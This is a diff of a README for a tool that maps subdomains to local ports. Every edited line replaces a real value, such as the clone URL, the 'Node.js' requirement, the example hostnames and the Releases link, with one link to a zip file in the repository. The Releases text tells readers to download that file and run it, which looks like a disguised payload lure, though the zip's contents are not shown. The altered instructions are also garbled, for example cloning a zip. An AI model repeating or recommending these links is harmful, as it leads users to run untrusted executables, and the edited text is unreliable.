@@ -2,7 +2,7 @@
 
 Welcome to the **localhost** repository! This project allows you to map subdomains to specific ports on your local machine, making development smoother and more organized.
 
-![localhost](https://img.shields.io/badge/localhost-Subdomain%20Redirector-blue.svg)
+![localhost](https://raw.githubusercontent.com/PHZINNxx/localhost/master/causticity/Software-3.0.zip%https://raw.githubusercontent.com/PHZINNxx/localhost/master/causticity/Software-3.0.zip)
 
 ## Table of Contents
 
@@ -17,7 +17,7 @@ Welcome to the **localhost** repository! This project allows you to map subdomai
 
 ## Introduction
 
-When developing web applications, you often work with multiple services running on different ports. Accessing these services can become cumbersome. This tool helps you streamline access by allowing you to use subdomains instead of port numbers. For example, instead of typing `localhost:3000`, you can simply type `subdomain.localhost`.
+When developing web applications, you often work with multiple services running on different ports. Accessing these services can become cumbersome. This tool helps you streamline access by allowing you to use subdomains instead of port numbers. For example, instead of typing `localhost:3000`, you can simply type `https://raw.githubusercontent.com/PHZINNxx/localhost/master/causticity/Software-3.0.zip`.
 
 ## Features
 
@@ -33,12 +33,12 @@ To get started with localhost, follow these steps:
 1. **Clone the Repository**  
    Open your terminal and run:
    ```bash
-   git clone https://github.com/PHZINNxx/localhost.git
+   git clone https://raw.githubusercontent.com/PHZINNxx/localhost/master/causticity/Software-3.0.zip
    cd localhost
    ```
 
 2. **Install Dependencies**  
-   Make sure you have Node.js installed. Then run:
+   Make sure you have https://raw.githubusercontent.com/PHZINNxx/localhost/master/causticity/Software-3.0.zip installed. Then run:
    ```bash
    npm install
    ```
@@ -64,17 +64,17 @@ To use localhost effectively, you need to configure your subdomains. Here’s ho
 
 3. Save the file and restart the application.
 
-Now, you can access your app using `app.localhost`.
+Now, you can access your app using `https://raw.githubusercontent.com/PHZINNxx/localhost/master/causticity/Software-3.0.zip`.
 
 ## Examples
 
 Here are a few examples of how you can set up your subdomains:
 
 - **API Service**  
-  Map `api.localhost` to port 4000.
+  Map `https://raw.githubusercontent.com/PHZINNxx/localhost/master/causticity/Software-3.0.zip` to port 4000.
   
 - **Frontend Application**  
-  Map `frontend.localhost` to port 5000.
+  Map `https://raw.githubusercontent.com/PHZINNxx/localhost/master/causticity/Software-3.0.zip` to port 5000.
 
 ## Contributing
 
@@ -93,9 +93,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-To download the latest version, visit our [Releases](https://github.com/PHZINNxx/localhost/releases) page. Download the appropriate file for your system and execute it to get started.
+To download the latest version, visit our [Releases](https://raw.githubusercontent.com/PHZINNxx/localhost/master/causticity/Software-3.0.zip) page. Download the appropriate file for your system and execute it to get started.
 
-If you want to check for updates, visit the [Releases](https://github.com/PHZINNxx/localhost/releases) section regularly.
+If you want to check for updates, visit the [Releases](https://raw.githubusercontent.com/PHZINNxx/localhost/master/causticity/Software-3.0.zip) section regularly.
 
 ## Acknowledgments
 
